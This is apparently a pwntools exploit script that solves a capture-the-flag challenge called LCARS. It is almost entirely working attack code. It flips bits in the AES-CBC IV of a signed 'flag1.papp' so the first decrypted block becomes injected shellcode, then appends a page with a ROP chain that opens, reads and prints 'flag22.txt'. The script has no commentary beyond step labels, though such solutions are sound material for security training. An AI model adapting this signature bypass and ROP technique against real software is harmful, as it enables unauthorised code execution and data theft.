from pwn import *
import hashlib
from app import Page
context.arch = 'amd64'

# assume we already have signed flag1.papp

# step 1: hack aes-cbc iv
blob = bytearray(open('flag1.papp').read())
iv = blob[0x154:0x164]
print str(iv).encode('hex')
first_block = bytearray('4883EC0848BF0000000001000000BE00'.decode('hex'))
our_shellcode = bytearray(asm('''
    // 1: jmp 1b
    add rsp, 0xf0;
    ret;
'''))
assert len(our_shellcode) <= len(first_block)
for i in xrange(len(our_shellcode)):
    blob[0x154 + i] = iv[i] ^ first_block[i] ^ our_shellcode[i]

# step 2: ROP open/read/write flag
blob[4] += 1

loader_base = 0x10000000
Xopen = loader_base + 0x470
Xecho = loader_base + 0x2f0
_read = loader_base + 0xb0
_exit = loader_base + 0x60
ret = loader_base + 0x67
pop_rdi = loader_base + 0x230
pop_rsi_r15 = loader_base + 0x22e

exp2_papp = str(blob) + str(Page(0xf0000000, 3, 
    ('flag22.txt'.ljust(0x10, '\x00') + ''.join(map(p64, [
        ret, ret, ret, ret, ret, ret, ret, ret,
        pop_rdi, 0xf0000000,
        Xopen,
        pop_rdi, 2,
        pop_rsi_r15, 0xf0000800, 0x123,
        _read,
        pop_rdi, 0xf0000800,
        Xecho,
        pop_rdi, 22,
        _exit
    ])))))

r = process(['./LCARS', './init.sys', './loader.sys', './echo.sys',
    './crypto.sys', './svc.uapp', 'root.key', 'flag1.papp', 'flag22.txt'])

def download(app, blob):
    r.sendline('download %s %d' % (app, len(blob)))
    r.send(blob)

download('exp2.papp', exp2_papp)
# raw_input('go')
r.sendline('run exp2.papp')

r.interactive()
